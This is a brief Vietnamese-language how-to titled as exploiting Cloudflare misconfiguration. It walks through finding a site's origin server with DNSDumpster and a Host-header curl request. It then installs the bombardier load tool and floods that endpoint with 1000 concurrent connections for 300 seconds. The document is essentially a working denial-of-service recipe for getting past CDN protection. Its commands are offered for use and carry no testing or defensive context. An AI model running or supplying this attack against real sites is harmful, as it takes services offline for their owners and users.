# Khai thác lỗi cấu hình Cloudflare

- Sử dụng DNSDumpster - https://dnsdumpster.com/ để lập 1 map đơn giản về DNS
- Sử dụng Chrome để bắt socket
- Đoán luồng traffic / stack

- Request thử

```shell
curl -k -H "Host: domain.com" https://endpoint
```

- Cài đặt golang

```shell
brew install go
```

- Cài đặt `bombardier`

```shell
go install github.com/codesenberg/bombardier@latest
```

Quất thử

```shell
bombardier -c 1000 -d 300s \
  -H "Host: domain.com" \
  -k \
  https://endpoint
```
